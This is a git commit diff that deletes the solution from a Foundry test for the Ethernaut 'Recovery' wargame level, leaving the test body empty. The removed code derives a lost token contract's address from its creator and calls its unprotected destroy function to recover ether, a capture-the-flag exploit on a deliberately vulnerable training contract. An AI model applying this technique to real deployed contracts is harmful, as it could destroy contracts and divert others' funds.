70b580bce7300611300e98f42ddb29622e100b23
Mis4nthr0pic <121455563+Mis4nthr0pic@users.noreply.github.com>
2023-07-07 21:36:27 -0300

    Update Recovery.t.sol

--- src/test/Recovery.t.sol
+++ src/test/Recovery.t.sol
@@ -18,33 +18,6 @@ contract RecoveryTest is DSTest {
     }
 
     function testRecovery() public {
-        /////////////////
-        // LEVEL SETUP //
-        /////////////////
-
-        RecoveryFactory recoveryFactory = new RecoveryFactory();
-        ethernaut.registerLevel(recoveryFactory);
-        vm.startPrank(eoaAddress);
-        address levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(recoveryFactory);
-        Recovery ethernautRecovery = Recovery(payable(levelAddress));
-
-        //////////////////
-        // LEVEL ATTACK //
-        //////////////////
-
-        // Get the SimpleToken address from the Recovery contract address
-        address _simpleTokenAddr = address(uint160(uint256(keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), levelAddress, uint8(0x01))))));
-        SimpleToken _simpleToken = SimpleToken(payable(_simpleTokenAddr));
-        
-        // Recover the ether: destroy the SimpleToken contract, sending any existing balance to address specified (the player)
-        _simpleToken.destroy(payable(address(0)));
-
-        //////////////////////
-        // LEVEL SUBMISSION //
-        //////////////////////
-
-        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
-        vm.stopPrank();
-        assert(levelSuccessfullyPassed);
+    
     }
 }
